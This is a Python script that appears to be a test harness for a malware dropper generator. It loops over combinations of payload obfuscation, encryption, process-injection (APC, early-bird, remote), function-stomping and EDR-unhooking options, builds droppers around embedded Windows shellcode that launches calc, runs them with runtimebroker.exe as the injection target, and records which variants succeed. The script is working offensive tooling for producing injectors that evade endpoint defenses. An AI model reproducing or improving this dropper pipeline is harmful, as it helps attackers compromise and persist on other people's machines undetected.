import psutil
import subprocess
import itertools

from controllers import *


ENCODING_ALGS = [None, "IPV4_OBFUSCATION", "IPV6_OBFUSCATION", "MAC_OBFUSCATION", "UUID_OBFUSCATION"]
ENCRYPTION_ALGS = [None, "AES_ENCRYPTION", "RC4_ENCRYPTION", "XOR_ENCRYPTION"]
INJECTION_TECHNIQUES = ["REMOTE_PROCESS_INJECTION", "APC_INJECTION", "EARLY_BIRD_INJECTION"]
PAYLOAD_LOADING_TECHNIQUES = [None, "IN_MEMORY", "FUNCTION_STOMPING", "FILE_MAPPING"]
UNHOOKING_TECHNIQUES = [None, "KNOWN_DLLS_UNHOOKING", "SUSPENDED_PROCESS_UNHOOKING"]

SHELLCODE = "0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44, 0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44, 0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41, 0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF, 0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00"


def find_process_by_name(target_name):
    for proc in psutil.process_iter(['name', 'pid']):
        try:
            if proc.info['name'] and proc.info['name'].lower() == target_name.lower():
                print(f"Found {target_name} with PID: {proc.info['pid']}")
                return proc.info['pid']
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass
    print(f"No process named {target_name} found.")
    return None

def check_and_kill_process(pid):
    try:
        process = psutil.Process(pid)
        
        if process.is_running():
            print(f"Process {process.name()} is running. Terminating...")
            process.terminate()
            process.wait()
            return True
    except psutil.NoSuchProcess:
        pass
    except psutil.AccessDenied:
        print(f"Access denied to PID {pid}.")
    except Exception as e:
        print(f"An error occurred: {e}")
    
    return False


def run_exe_file(file_path: str):
    try:
        # Run the executable and wait for it to complete
        process = subprocess.Popen([file_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return process.pid
    except subprocess.CalledProcessError as e:
        print(f"Error running {file_path}: {e.stderr}")
        return None


def generate_configurations():
    encoding_encryption_algs = list(set(ENCODING_ALGS + ENCRYPTION_ALGS))
    
    combinations = itertools.product(
        encoding_encryption_algs, INJECTION_TECHNIQUES, PAYLOAD_LOADING_TECHNIQUES, UNHOOKING_TECHNIQUES
    )
    
    process_name = "runtimebroker.exe"    
    
    configurations = [
        {
            "preprocessing_macros": [
                encoding_encryption if encoding_encryption else "",
                injection if injection else "",
                payload if payload else "",
                unhooking if unhooking else "",
                "OBFUSCATED_PAYLOAD" if encoding_encryption else "",
                "UNHOOKING_ENABLED" if unhooking else "",
            ],
            "shellcode": SHELLCODE,
            "filename": f"auto_test",
            "file_extension": ".exe",
            "out_filename": f"auto_test.exe",
            "process_name": process_name if injection in ["REMOTE_PROCESS_INJECTION", "EARLY_BIRD_INJECTION"] else None,
            'executable': None,
            'execution_arguments': None,
            'hide_console': None,
        }
        for encoding_encryption, injection, payload, unhooking in combinations
    ]
    return configurations

if __name__ == "__main__":
    counter  = 0
    
    curr_dir = os.path.dirname(os.path.abspath(__file__))
    temp_dir = copy_project_to_temp()
    results = []
    
    for config in generate_configurations():
        try:           
            count = sum(1 for item in config.get("preprocessing_macros") if item != "")
            if count < 2:
                continue
            
            counter += 1
            if counter > 20:
                break
            
            build_dropper(config, temp_dir)
            run_exe_file(os.path.join(curr_dir,"dropper_outputs",config['out_filename']))
            pid = find_process_by_name("CalculatorApp.exe")
            if pid:
                status = check_and_kill_process(pid)
                if status:
                    results.append((config, "Success"))
                else:
                    results.append((config, "Failed"))
            else:
                print(f"Failed to run {config['out_filename']}")
                results.append((config, "Failed"))
            os.remove(os.path.join(curr_dir,"dropper_outputs",config['out_filename']))
        except Exception as e:
            print(f"An error occurred: {e}")
            print(f"Configuration: {config.get('preprocessing_macros')}, Status: Error")
            results.append((config, "Error"))
    print("Results:")
    for config, status in results:
        print(f"Configuration: {config.get("preprocessing_macros")}, Status: {status}")